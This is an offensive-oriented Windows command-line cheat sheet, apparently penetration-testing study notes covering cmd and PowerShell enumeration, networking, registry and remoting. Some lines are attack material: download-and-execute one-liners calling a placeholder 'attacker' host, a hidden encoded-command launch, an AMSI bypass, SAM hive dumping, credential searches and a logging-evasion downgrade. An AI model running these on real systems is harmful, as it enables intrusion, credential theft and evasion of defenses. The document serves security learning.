# 06 — Introduction to Windows CLI

`cmd.exe` and PowerShell quick reference oriented at offensive use.

## cmd vs PowerShell

| | cmd.exe | PowerShell |
|---|---|---|
| Output | Text | Objects (.NET) |
| Pipe semantics | Stream of bytes | Object pipeline |
| Scripting | Batch (`.bat`/`.cmd`) | `.ps1` |
| Help | `help`, `cmd /?` | `Get-Help`, `-?` |
| Aliases | None | Many (`ls`, `cat`, `ps`) |

PowerShell versions worth knowing:
- 2.0 — present on legacy hosts; downgradeable from newer (`-Version 2`) to bypass some logging.
- 5.1 — last "Windows PowerShell"; baseline on modern Windows 10/11/Server 2016+.
- 7.x — cross-platform, `pwsh.exe`.

## Filesystem & navigation

```cmd
:: cmd
dir
dir /a /s /b C:\
cd C:\Users
type file.txt
copy a b
move a b
del file
mkdir dir
rmdir /s /q dir
where powershell
```

```powershell
# PowerShell
Get-ChildItem -Force -Recurse C:\Users\Public
Get-Content file.txt
Set-Location C:\Users
Copy-Item a b
Move-Item a b
Remove-Item -Recurse -Force dir
Test-Path C:\path
Resolve-Path .\file
```

## Users, groups, sessions

```cmd
whoami /all
whoami /priv
net user
net user Administrator
net localgroup
net localgroup Administrators
net session
qwinsta
quser
```

```powershell
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember Administrators
[System.Security.Principal.WindowsIdentity]::GetCurrent() | fl *
```

## Processes & services

```cmd
tasklist /v
tasklist /svc
taskkill /PID 1234 /F
sc query
sc qc <svc>
sc start <svc>
sc stop <svc>
wmic process list full
```

```powershell
Get-Process
Get-Process | Where-Object {$_.ProcessName -like "lsass*"}
Stop-Process -Id 1234 -Force
Get-Service
Get-Service | Where-Object Status -eq Running
Get-CimInstance Win32_Service | select Name, StartName, PathName, State
```

## Networking

```cmd
ipconfig /all
ipconfig /displaydns
route print
arp -a
netstat -ano
netstat -anob              :: with image names (admin)
nslookup host
ping -n 4 host
tracert host
```

```powershell
Get-NetIPAddress
Get-NetTCPConnection -State Listen
Get-DnsClientCache
Resolve-DnsName <host>
Test-NetConnection <host> -Port 445 -InformationLevel Detailed
```

## Files: search, hash, attributes

```cmd
findstr /S /I "password" C:\inetpub\*.config
dir /s /b C:\ | findstr /I "id_rsa unattend web.config"
attrib +h file
certutil -hashfile file SHA256
icacls C:\path
```

```powershell
Get-ChildItem -Recurse -Force -Include *.config,*.xml,*.ps1 -EA SilentlyContinue |
  Select-String -Pattern "password","secret","key" -List | select Path

Get-FileHash file -Algorithm SHA256
(Get-Item file).Attributes
Get-Acl C:\path | fl
```

## Environment & registry

```cmd
set
set PATH
echo %USERPROFILE%
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\SimonTatham\PuTTY\Sessions /s
reg add HKCU\Env /v X /t REG_SZ /d "value" /f
reg save HKLM\SAM C:\Temp\sam.save
```

```powershell
Get-ChildItem Env:
$env:Path
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Run
New-ItemProperty -Path HKCU:\Env -Name X -Value "value" -PropertyType String -Force
```

## Scheduled tasks & startup

```cmd
schtasks /query /fo LIST /v
schtasks /create /tn name /tr "C:\path.exe" /sc minute /mo 1
schtasks /run /tn name
```

```powershell
Get-ScheduledTask | where {$_.State -eq "Ready"}
Get-CimInstance Win32_StartupCommand | select Name, Command, Location, User
```

## Useful one-liners

```powershell
# Download a file
(New-Object Net.WebClient).DownloadFile('http://attacker/f.exe','C:\Temp\f.exe')
Invoke-WebRequest http://attacker/f.exe -OutFile C:\Temp\f.exe

# Run remote script in memory
IEX (New-Object Net.WebClient).DownloadString('http://attacker/x.ps1')
iwr -UseBasicParsing http://attacker/x.ps1 | iex

# Base64-encoded command
$cmd = "Get-Process"
$b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
powershell -NoP -W Hidden -Enc $b64

# Disable AMSI in current PS session (research/lab only)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Read file as bytes
[IO.File]::ReadAllBytes("C:\file") | Format-Hex

# Run as another user (interactive)
runas /user:DOMAIN\user "powershell.exe"
runas /netonly /user:DOMAIN\user "powershell.exe"   # use creds only over network
```

## Execution policy & bypasses

```powershell
Get-ExecutionPolicy -List
powershell -ExecutionPolicy Bypass -File script.ps1
powershell -ep bypass -c "..."
```

Execution policy is an invocation guideline, not a security boundary — `-ep bypass`, piping into `iex`, or invoking via `-Command` all work.

## WMI / CIM

```cmd
wmic os get Caption,Version,BuildNumber
wmic qfe list brief
wmic process list brief
wmic service list brief
```

```powershell
Get-CimInstance Win32_OperatingSystem | select Caption, Version, BuildNumber
Get-CimInstance Win32_Process | select Name, ProcessId, CommandLine
Get-CimInstance Win32_LoggedOnUser
```

## Remoting

```powershell
# WinRM
Enter-PSSession -ComputerName host -Credential (Get-Credential)
Invoke-Command -ComputerName host -ScriptBlock { whoami } -Credential $c

# Trusted hosts (for workgroup/cross-domain)
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "host1,host2"
```

## Logging worth knowing exists

- Windows Event Logs: `Security`, `System`, `Application`, `Microsoft-Windows-PowerShell/Operational` (4103/4104), `Sysmon/Operational`, `Microsoft-Windows-Windows Defender/Operational`.
- ScriptBlock logging (event 4104) records full PowerShell script content when enabled — be aware on engagements with detection scope.

## Sources

- Microsoft Learn (cmd reference): https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/windows-commands
- Microsoft Learn (PowerShell): https://learn.microsoft.com/en-us/powershell/
- LOLBAS: https://lolbas-project.github.io/
